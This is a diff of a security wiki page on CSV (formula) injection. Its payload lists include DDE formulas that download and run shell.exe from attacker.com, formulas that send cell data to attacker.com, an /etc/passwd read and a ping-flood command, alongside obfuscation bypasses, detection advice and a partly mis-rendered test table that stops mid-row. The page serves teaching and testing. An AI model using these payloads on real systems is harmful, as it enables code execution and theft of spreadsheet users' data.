@@ -1,39 +1,57 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en" dir="ltr" data-theme="light">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="CSV Injection # CSV Injection, also known as Formula Injection, is a security vulnerability that occurs when untrusted user input is embedded into exported CSV files without proper sanitization. When opened in spreadsheet programs like Microsoft Excel or LibreOffice Calc, cells starting with =, &#43;, -, @, or similar characters are interpreted as formulas, potentially leading to command execution, data exfiltration, or other malicious actions.
-Understanding CSV Basics # CSV Format Overview">
-<meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="CSV Injection" />
-<meta property="og:description" content="CSV Injection # CSV Injection, also known as Formula Injection, is a security vulnerability that occurs when untrusted user input is embedded into exported CSV files without proper sanitization. When opened in spreadsheet programs like Microsoft Excel or LibreOffice Calc, cells starting with =, &#43;, -, @, or similar characters are interpreted as formulas, potentially leading to command execution, data exfiltration, or other malicious actions.
-Understanding CSV Basics # CSV Format Overview" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/CSV-Injection/" /><meta property="article:section" content="docs" />
-
-<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
-<title>CSV Injection | Cyber Security Wiki</title>
-<link rel="manifest" href="/manifest.json">
-<link rel="icon" href="/favicon.png" type="image/x-icon">
-<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
-  <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
-
-  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
-<!--
+  <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
 -->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="CSV Injection# CSV Injection, also known as Formula Injection, is a security vulnerability that occurs when untrusted user input is embedded into exported CSV files without proper sanitization. When opened in spreadsheet programs like Microsoft Excel or LibreOffice Calc, cells starting with =, &#43;, -, @, or similar characters are interpreted as formulas, potentially leading to command execution, data exfiltration, or other malicious actions.
+Understanding CSV Basics# CSV Format Overview
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/CSV-Injection/">
+	<meta property="og:site_name" content="Cyber Security Wiki">
+	<meta property="og:title" content="CSV Injection">
+	<meta property="og:description" content="CSV Injection# CSV Injection, also known as Formula Injection, is a security vulnerability that occurs when untrusted user input is embedded into exported CSV files without proper sanitization. When opened in spreadsheet programs like Microsoft Excel or LibreOffice Calc, cells starting with =, &#43;, -, @, or similar characters are interpreted as formulas, potentially leading to command execution, data exfiltration, or other malicious actions.
+Understanding CSV Basics# CSV Format Overview">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30">
+
+
+	<meta itemprop="name" content="CSV Injection">
+	<meta itemprop="description" content="CSV Injection# CSV Injection, also known as Formula Injection, is a security vulnerability that occurs when untrusted user input is embedded into exported CSV files without proper sanitization. When opened in spreadsheet programs like Microsoft Excel or LibreOffice Calc, cells starting with =, &#43;, -, @, or similar characters are interpreted as formulas, potentially leading to command execution, data exfiltration, or other malicious actions.
+Understanding CSV Basics# CSV Format Overview">
+	<meta itemprop="dateModified" content="2026-08-05T21:53:05+05:30">
+	<meta itemprop="wordCount" content="1064">
+
+<title>CSV Injection • Cyber Security Wiki</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="https://cyber-security.wiki/docs/application-security/web/CSV-Injection/">
+<link rel="stylesheet" href="/book.min.4d77e98d764f495b145946ef9260681bab38aaf7bc01f96a6f61a3a0fea19dbf.css" integrity="sha256-TXfpjXZPSVsUWUbvkmBoG6s4qve8Aflqb2GjoP6hnb8=" crossorigin="anonymous">
+
+
+
+  <script defer type="module" src="/en.search.min.07d8a67671a2c683431c7034b07b0f4b6c6daae7a9c289fde2e3663a9ff4e6c5.js" integrity="sha256-B9imdnGixoNDHHA0sHsPS2xtquepwon94uNmOp/05sU=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
   
 </head>
-<body dir="ltr">
+<body dir="ltr" class="book-kind-page book-type-docs">
   <input type="checkbox" class="hidden toggle" id="menu-control" />
   <input type="checkbox" class="hidden toggle" id="toc-control" />
   <main class="container flex">
-    <aside class="book-menu">
-      <div class="book-menu-content">
-        
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
   <nav>
 <h2 class="book-brand">
   <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
@@ -41,11 +59,15 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 
 
-<div class="book-search">
-  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
   <div class="book-search-spinner hidden"></div>
   <ul id="book-search-results"></ul>
 </div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
 
 
 
@@ -56,9 +78,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-
-
-  
 
 
 
@@ -73,8 +92,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
-    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-1f4bf90b10ddb9d04537ec779b672afa" class="toggle" checked />
+    <label for="section-1f4bf90b10ddb9d04537ec779b672afa" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Application Security</a>
     </label>
   
@@ -90,8 +109,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
-    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-97ce584ed7ffb43a07e43ad9f5889c71" class="toggle"  />
+    <label for="section-97ce584ed7ffb43a07e43ad9f5889c71" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Thick Client</a>
     </label>
   
@@ -177,8 +196,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
-    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-26c356cfc062017e944cd67af2378245" class="toggle"  />
+    <label for="section-26c356cfc062017e944cd67af2378245" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Vulnerable Applications</a>
     </label>
   
@@ -225,8 +244,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
-    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-db0925704b156fffd3db5c66cb42d41d" class="toggle" checked />
+    <label for="section-db0925704b156fffd3db5c66cb42d41d" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Web</a>
     </label>
   
@@ -980,8 +999,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
-    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="toggle"  />
+    <label for="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Cloud Security</a>
     </label>
   
@@ -1002,8 +1021,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
-    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5ef99b8721144773b97f7bfef900362b" class="toggle"  />
+    <label for="section-5ef99b8721144773b97f7bfef900362b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">DevSecOps</a>
     </label>
   
@@ -1024,8 +1043,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
-    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="toggle"  />
+    <label for="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Exploit Development</a>
     </label>
   
@@ -1046,8 +1065,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
-    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-2aeefa6ddff0a8e5db97003607c446af" class="toggle"  />
+    <label for="section-2aeefa6ddff0a8e5db97003607c446af" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">IoT Security</a>
     </label>
   
@@ -1068,8 +1087,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
-    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-150b068623f422b911e0c10751e41d4b" class="toggle"  />
+    <label for="section-150b068623f422b911e0c10751e41d4b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Machine Learning</a>
     </label>
   
@@ -1103,8 +1122,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
-    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5d1d2284d8b625a6ff29beaf70c29606" class="toggle"  />
+    <label for="section-5d1d2284d8b625a6ff29beaf70c29606" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Network</a>
     </label>
   
@@ -1125,8 +1144,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
-    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="toggle"  />
+    <label for="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Red Teaming</a>
     </label>
   
@@ -1147,8 +1166,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
-    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-48d01542c459fd722a2e871cc9bbd985" class="toggle"  />
+    <label for="section-48d01542c459fd722a2e871cc9bbd985" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Threat Modelling</a>
     </label>
   
@@ -1169,35 +1188,13 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-<hr>
-<b>
 
-
-  
-<ul>
-  
-  <li>
-    <a href="/contribute/" >
-        Contribute
-      </a>
-  </li>
-  
-  <li>
-    <a href="https://securecode.wiki" target="_blank" rel="noopener">
-        Secure Code Wiki by Payatu
-      </a>
-  </li>
-  
-</ul>
+<ul><li><a href="/contribute/" title="Contribute">contribute</a></li><li><a href="https://securecode.wiki" target="_blank" rel="noopener">Secure Code Wiki by Payatu</a></li></ul>
 
 
 
 
-
-
-</b>
 </nav>
-
 
 
 
@@ -1205,30 +1202,31 @@ https://github.com/alex-shpak/hugo-book
   <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
 
 
+
+  </div>
+</aside>
  
-      </div>
-    </aside>
 
     <div class="book-page">
-      <header class="book-header">
+      <header class="book-header hidden">
         
   <div class="flex align-center justify-between">
   <label for="menu-control">
-    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>CSV Injection</strong>
+  <h3>CSV Injection</h3>
 
   <label for="toc-control">
     
-    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
     
   </label>
 </div>
 
 
   
-  <aside class="hidden clearfix">
+  <aside class="hidden">
     
   
 <nav id="TableOfContents">
@@ -1297,22 +1295,15 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="csv-injection">
-  CSV Injection
-  <a class="anchor" href="#csv-injection">#</a>
-</h1>
+  <article class="markdown book-article"><h1 id="csv-injection">CSV Injection<a class="anchor" href="#csv-injection">#</a></h1>
 <p><strong>CSV Injection</strong>, also known as Formula Injection, is a security vulnerability that occurs when untrusted user input is embedded into exported CSV files without proper sanitization. When opened in spreadsheet programs like Microsoft Excel or LibreOffice Calc, cells starting with <code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>, or similar characters are interpreted as formulas, potentially leading to command execution, data exfiltration, or other malicious actions.</p>
-<h2 id="understanding-csv-basics">
-  Understanding CSV Basics
-  <a class="anchor" href="#understanding-csv-basics">#</a>
-</h2>
+<h2 id="understanding-csv-basics">Understanding CSV Basics<a class="anchor" href="#understanding-csv-basics">#</a></h2>
 <ul>
 <li>
 <p><strong>CSV Format Overview</strong></p>
 <p>Comma-Separated Values (CSV) is a plain-text format for tabular data. Each line represents a row, and fields are separated by commas (or semicolons in some locales). Example:</p>
 <pre tabindex="0"><code>Name,Email,Notes
-John Doe,john@example.com,Regular user
-</code></pre></li>
+John Doe,john@example.com,Regular user</code></pre></li>
 <li>
 <p><strong>Spreadsheet Interpretation</strong></p>
 <p>When opened in Excel/Calc:</p>
@@ -1336,14 +1327,10 @@ John Doe,john@example.com,Regular user
 +cmd|&#39; /C notepad&#39;!A1
 -2+3+cmd|&#39; /C calc&#39;!A0
 @SUM(1+9)*cmd|&#39; /C calc&#39;!A0
-=HYPERLINK(&#34;&lt;http://evil.com&gt;&#34;,&#34;Click&#34;)
-</code></pre></li>
+=HYPERLINK(&#34;&lt;http://evil.com&gt;&#34;,&#34;Click&#34;)</code></pre></li>
 </ul>
 <hr>
-<h2 id="csv-injection-attack-surface">
-  CSV Injection Attack Surface
-  <a class="anchor" href="#csv-injection-attack-surface">#</a>
-</h2>
+<h2 id="csv-injection-attack-surface">CSV Injection Attack Surface<a class="anchor" href="#csv-injection-attack-surface">#</a></h2>
 <ul>
 <li><strong>Export Features</strong> (reports, user lists, transactions)</li>
 <li><strong>Admin Panels</strong> (customer management, logs)</li>
@@ -1353,70 +1340,38 @@ John Doe,john@example.com,Regular user
 <li><strong>Any field stored in DB and later exported to CSV</strong></li>
 </ul>
 <hr>
-<h2 id="exploiting-csv-injection">
-  Exploiting CSV Injection
-  <a class="anchor" href="#exploiting-csv-injection">#</a>
-</h2>
-<h3 id="1-command-execution-dde">
-  1. <strong>Command Execution (DDE)</strong>
-  <a class="anchor" href="#1-command-execution-dde">#</a>
-</h3>
+<h2 id="exploiting-csv-injection">Exploiting CSV Injection<a class="anchor" href="#exploiting-csv-injection">#</a></h2>
+<h3 id="1-command-execution-dde">1. <strong>Command Execution (DDE)</strong><a class="anchor" href="#1-command-execution-dde">#</a></h3>
 <p>Assume data is exported directly:</p>
 <p>Payloads:</p>
 <pre tabindex="0"><code>=cmd|&#39; /C calc&#39;!A0
 =cmd|&#39;/C powershell Invoke-WebRequest &#34;&lt;http://attacker.com/shell.exe&gt;&#34; -OutFile &#34;$env:Temp\shell.exe&#34;; Start-Process &#34;$env:Temp\shell.exe&#34;&#39;!A1
-@SUM(1+9)*cmd|&#39; /C calc&#39;!A0
-</code></pre><p>Example: Inject into a &ldquo;First Name&rdquo; field → Export transactions → Open CSV → Calculator launches (or malware executes).</p>
-<h3 id="2-data-exfiltration-via-hyperlinkimport">
-  2. <strong>Data Exfiltration via Hyperlink/Import</strong>
-  <a class="anchor" href="#2-data-exfiltration-via-hyperlinkimport">#</a>
-</h3>
+@SUM(1+9)*cmd|&#39; /C calc&#39;!A0</code></pre><p>Example: Inject into a &ldquo;First Name&rdquo; field → Export transactions → Open CSV → Calculator launches (or malware executes).</p>
+<h3 id="2-data-exfiltration-via-hyperlinkimport">2. <strong>Data Exfiltration via Hyperlink/Import</strong><a class="anchor" href="#2-data-exfiltration-via-hyperlinkimport">#</a></h3>
 <pre tabindex="0"><code>=HYPERLINK(&#34;&lt;http://attacker.com?data=&#34;&amp;A1&amp;&#34;,&#34;&amp;B1,&#34;Click&gt; Here&#34;)
 =WEBSERVICE(CONCAT(&#34;&lt;http://attacker.com/log?v=&gt;&#34;,A1))
-=IMPORTDATA(&#34;&lt;http://attacker.com/collect.csv&gt;&#34;)
-</code></pre><p>These send cell contents to the attacker&rsquo;s server when the file opens or the link is clicked.</p>
-<h3 id="3-blindadvanced-formula-injection">
-  3. <strong>Blind/Advanced Formula Injection</strong>
-  <a class="anchor" href="#3-blindadvanced-formula-injection">#</a>
-</h3>
+=IMPORTDATA(&#34;&lt;http://attacker.com/collect.csv&gt;&#34;)</code></pre><p>These send cell contents to the attacker&rsquo;s server when the file opens or the link is clicked.</p>
+<h3 id="3-blindadvanced-formula-injection">3. <strong>Blind/Advanced Formula Injection</strong><a class="anchor" href="#3-blindadvanced-formula-injection">#</a></h3>
 <p>Test via response differences or file reads:</p>
 <pre tabindex="0"><code>=&#39;file://etc/passwd&#39;#$passwd.A1  (Linux file read example)
-=IFERROR(cmd|&#39;/c whoami&#39;!A1,&#34;&#34;)
-</code></pre><h3 id="4-denial-of-service--botnet-creation">
-  4. <strong>Denial of Service / Botnet Creation</strong>
-  <a class="anchor" href="#4-denial-of-service--botnet-creation">#</a>
-</h3>
+=IFERROR(cmd|&#39;/c whoami&#39;!A1,&#34;&#34;)</code></pre><h3 id="4-denial-of-service--botnet-creation">4. <strong>Denial of Service / Botnet Creation</strong><a class="anchor" href="#4-denial-of-service--botnet-creation">#</a></h3>
 <p>Inject payloads that make the victim&rsquo;s machine ping a target endlessly:</p>
-<pre tabindex="0"><code>=cmd|&#39;/C ping -t target.com -l 65500&#39;!A1
-</code></pre><p>Scaled across many victims → distributed DoS.</p>
-<h3 id="5-attribute--data-manipulation">
-  5. <strong>Attribute / Data Manipulation</strong>
-  <a class="anchor" href="#5-attribute--data-manipulation">#</a>
-</h3>
+<pre tabindex="0"><code>=cmd|&#39;/C ping -t target.com -l 65500&#39;!A1</code></pre><p>Scaled across many victims → distributed DoS.</p>
+<h3 id="5-attribute--data-manipulation">5. <strong>Attribute / Data Manipulation</strong><a class="anchor" href="#5-attribute--data-manipulation">#</a></h3>
 <p>Modify exported data appearance or embed tracking:</p>
-<pre tabindex="0"><code>=10+20+cmd|&#39; /C calc&#39;!A0  (obfuscated)
-</code></pre><p><strong>Example:</strong></p>
+<pre tabindex="0"><code>=10+20+cmd|&#39; /C calc&#39;!A0  (obfuscated)</code></pre><p><strong>Example:</strong></p>
 <p>Username field: <code>=cmd|' /C calc'!A0</code></p>
 <p>Exported CSV opens → payload executes on admin&rsquo;s machine.</p>
-<h3 id="6-escalating-impact">
-  6. <strong>Escalating Impact</strong>
-  <a class="anchor" href="#6-escalating-impact">#</a>
-</h3>
+<h3 id="6-escalating-impact">6. <strong>Escalating Impact</strong><a class="anchor" href="#6-escalating-impact">#</a></h3>
 <p>CSV injection combined with social engineering can trick users into trusting exported files and executing malicious formulas or payloads.</p>
-<h3 id="7-blind-csv-injection-techniques">
-  7. <strong>Blind CSV Injection Techniques</strong>
-  <a class="anchor" href="#7-blind-csv-injection-techniques">#</a>
-</h3>
+<h3 id="7-blind-csv-injection-techniques">7. <strong>Blind CSV Injection Techniques</strong><a class="anchor" href="#7-blind-csv-injection-techniques">#</a></h3>
 <ul>
 <li>Boolean-based: Different spreadsheet behavior (error vs. success).</li>
 <li>Content-based: Check exported file for executed formulas.</li>
 <li>Time-based: Heavy formulas causing delays (rare).</li>
 </ul>
 <hr>
-<h2 id="csv-injection-bypasses--obfuscation">
-  CSV Injection Bypasses &amp; Obfuscation
-  <a class="anchor" href="#csv-injection-bypasses--obfuscation">#</a>
-</h2>
+<h2 id="csv-injection-bypasses--obfuscation">CSV Injection Bypasses &amp; Obfuscation<a class="anchor" href="#csv-injection-bypasses--obfuscation">#</a></h2>
 <ul>
 <li><strong>Encoded Payloads:</strong> <code>%3Dcmd%7C%27%2Fc%20calc%27%21A0</code></li>
 <li><strong>Prefix Variations:</strong> Tab (<code>\t=cmd...</code>), single quote (<code>'=cmd...</code>), space.</li>
@@ -1426,69 +1381,30 @@ John Doe,john@example.com,Regular user
 <li><strong>Null/Control Chars:</strong> Carriage return, line feed to split cells.</li>
 </ul>
 <hr>
-<h2 id="advance-attack-scenarios">
-  Advance Attack Scenarios
-  <a class="anchor" href="#advance-attack-scenarios">#</a>
-</h2>
-<h3 id="1-nested-formula-abuse">
-  1. <strong>Nested Formula Abuse</strong>
-  <a class="anchor" href="#1-nested-formula-abuse">#</a>
-</h3>
+<h2 id="advance-attack-scenarios">Advance Attack Scenarios<a class="anchor" href="#advance-attack-scenarios">#</a></h2>
+<h3 id="1-nested-formula-abuse">1. <strong>Nested Formula Abuse</strong><a class="anchor" href="#1-nested-formula-abuse">#</a></h3>
 <p>Force evaluation with <code>=IFERROR(IMPORTDATA(&quot;&lt;http://attacker.com&gt;&quot;),&quot;&quot;)</code> wrapped in benign math.</p>
-<h3 id="2-second-order-injection">
-  2. <strong>Second-Order Injection</strong>
-  <a class="anchor" href="#2-second-order-injection">#</a>
-</h3>
+<h3 id="2-second-order-injection">2. <strong>Second-Order Injection</strong><a class="anchor" href="#2-second-order-injection">#</a></h3>
 <p>Malicious payload is stored in the database during input submission and later triggered when the data is exported to an admin CSV file.</p>
-<h3 id="3-active-directory--enterprise-exfil">
-  3. <strong>Active Directory / Enterprise Exfil</strong>
-  <a class="anchor" href="#3-active-directory--enterprise-exfil">#</a>
-</h3>
+<h3 id="3-active-directory--enterprise-exfil">3. <strong>Active Directory / Enterprise Exfil</strong><a class="anchor" href="#3-active-directory--enterprise-exfil">#</a></h3>
 <p>Inject malicious formulas into data sources or logs that are later exported as CSV, potentially exposing credentials or sensitive information when opened by administrators.</p>
-<h3 id="4-data-exfiltration-via-attribute-expansion">
-  4. <strong>Data Exfiltration via Attribute Expansion</strong>
-  <a class="anchor" href="#4-data-exfiltration-via-attribute-expansion">#</a>
-</h3>
+<h3 id="4-data-exfiltration-via-attribute-expansion">4. <strong>Data Exfiltration via Attribute Expansion</strong><a class="anchor" href="#4-data-exfiltration-via-attribute-expansion">#</a></h3>
 <p><code>=(JOIN(&quot;,&quot;,A1:Z100))</code> concatenated and sent via WEBSERVICE.</p>
-<h3 id="5-user-harvesting--enumeration">
-  5. <strong>User Harvesting / Enumeration</strong>
-  <a class="anchor" href="#5-user-harvesting--enumeration">#</a>
-</h3>
+<h3 id="5-user-harvesting--enumeration">5. <strong>User Harvesting / Enumeration</strong><a class="anchor" href="#5-user-harvesting--enumeration">#</a></h3>
 <p>Payloads that trigger different warnings based on data presence.</p>
-<h3 id="6-time-based--heavy-query-exploitation">
-  6. <strong>Time-Based / Heavy Query Exploitation</strong>
-  <a class="anchor" href="#6-time-based--heavy-query-exploitation">#</a>
-</h3>
+<h3 id="6-time-based--heavy-query-exploitation">6. <strong>Time-Based / Heavy Query Exploitation</strong><a class="anchor" href="#6-time-based--heavy-query-exploitation">#</a></h3>
 <p>Complex nested formulas causing spreadsheet hangs or high CPU.</p>
-<h3 id="7-csv-injection-in-password-reset--logs">
-  7. <strong>CSV Injection in Password Reset / Logs</strong>
-  <a class="anchor" href="#7-csv-injection-in-password-reset--logs">#</a>
-</h3>
+<h3 id="7-csv-injection-in-password-reset--logs">7. <strong>CSV Injection in Password Reset / Logs</strong><a class="anchor" href="#7-csv-injection-in-password-reset--logs">#</a></h3>
 <p>Malicious payloads injected into audit logs or password reset records may execute when administrators export and open the CSV file.</p>
-<h3 id="8-null-byte--truncation">
-  8. <strong>Null Byte / Truncation</strong>
-  <a class="anchor" href="#8-null-byte--truncation">#</a>
-</h3>
+<h3 id="8-null-byte--truncation">8. <strong>Null Byte / Truncation</strong><a class="anchor" href="#8-null-byte--truncation">#</a></h3>
 <p>Rare, but combined with other evasions.</p>
-<h3 id="9-chained-with-other-flaws">
-  9. <strong>Chained with Other Flaws</strong>
-  <a class="anchor" href="#9-chained-with-other-flaws">#</a>
-</h3>
+<h3 id="9-chained-with-other-flaws">9. <strong>Chained with Other Flaws</strong><a class="anchor" href="#9-chained-with-other-flaws">#</a></h3>
 <p>CSV injection combined with weak session management can increase impact and potentially lead to persistent administrative compromise.</p>
-<h3 id="10-cross-platform-exploitation">
-  10. <strong>Cross-Platform Exploitation</strong>
-  <a class="anchor" href="#10-cross-platform-exploitation">#</a>
-</h3>
+<h3 id="10-cross-platform-exploitation">10. <strong>Cross-Platform Exploitation</strong><a class="anchor" href="#10-cross-platform-exploitation">#</a></h3>
 <p>Works in Excel, Calc, Google Sheets (limited); combine with macro-enabled exports.</p>
 <hr>
-<h2 id="detection-techniques">
-  Detection Techniques
-  <a class="anchor" href="#detection-techniques">#</a>
-</h2>
-<h3 id="manual-detection-techniques">
-  Manual Detection Techniques
-  <a class="anchor" href="#manual-detection-techniques">#</a>
-</h3>
+<h2 id="detection-techniques">Detection Techniques<a class="anchor" href="#detection-techniques">#</a></h2>
+<h3 id="manual-detection-techniques">Manual Detection Techniques<a class="anchor" href="#manual-detection-techniques">#</a></h3>
 <ul>
 <li><strong>Special Character Injection Testing:</strong> Inject formula payloads such as <code>=1+1</code>, <code>+cmd...</code>, or <code>-2+3+cmd...</code> and observe for unexpected execution or behavior.</li>
 <li><strong>Boolean-Based Testing:</strong> Inject conditional formulas and compare spreadsheet behavior, warnings, or output differences.</li>
@@ -1497,10 +1413,7 @@ John Doe,john@example.com,Regular user
 <li>**Time/Resource-Based Observation:**Check for delayed file opening, performance issues, or abnormal resource consumption.</li>
 <li><strong>Export Logic Testing:</strong> Inject payloads, export the data, and verify behavior when the CSV file is opened in spreadsheet applications.</li>
 </ul>
-<h3 id="automated-detection-techniques">
-  Automated Detection Techniques
-  <a class="anchor" href="#automated-detection-techniques">#</a>
-</h3>
+<h3 id="automated-detection-techniques">Automated Detection Techniques<a class="anchor" href="#automated-detection-techniques">#</a></h3>
 <ul>
 <li><strong>Proxy-Based Dynamic Scanning:</strong> Use Burp Intruder with CSV payload lists on input fields → export → analyze.</li>
 <li><strong>Fuzzing with Payload Libraries:</strong> GitHub payload lists (100+ entries) for Intruder.</li>
@@ -1513,56 +1426,50 @@ John Doe,john@example.com,Regular user
 <li>Custom scripts to scan exported CSVs for leading <code>= + - @</code></li>
 </ul>
 <hr>
-<h2 id="test-cases">
-  Test Cases
-  <a class="anchor" href="#test-cases">#</a>
-</h2>
+<h2 id="test-cases">Test Cases<a class="anchor" href="#test-cases">#</a></h2>
 <table>
-<thead>
-<tr>
-<th>Scenario</th>
-<th>Payload</th>
-<th>Expected Outcome</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Command Execution</td>
-<td>`=cmd</td>
-<td>&rsquo; /C calc&rsquo;!A0`</td>
-</tr>
-<tr>
-<td>Data Exfiltration</td>
-<td><code>=HYPERLINK(&quot;&lt;http://attacker.com?v=&quot;&amp;A1,&quot;Click&gt;&quot;)</code></td>
-<td>Data sent to attacker when clicked</td>
-</tr>
-<tr>
-<td>Obfuscated Exec</td>
-<td>`@SUM(1+9)*cmd</td>
-<td>&rsquo; /C calc&rsquo;!A0`</td>
-</tr>
-<tr>
-<td>File Read (Linux)</td>
-<td><code>='file://etc/passwd'#$passwd.A1</code></td>
-<td>Displays system file contents</td>
-</tr>
-<tr>
-<td>Remote Download + Exec</td>
-<td>`=cmd</td>
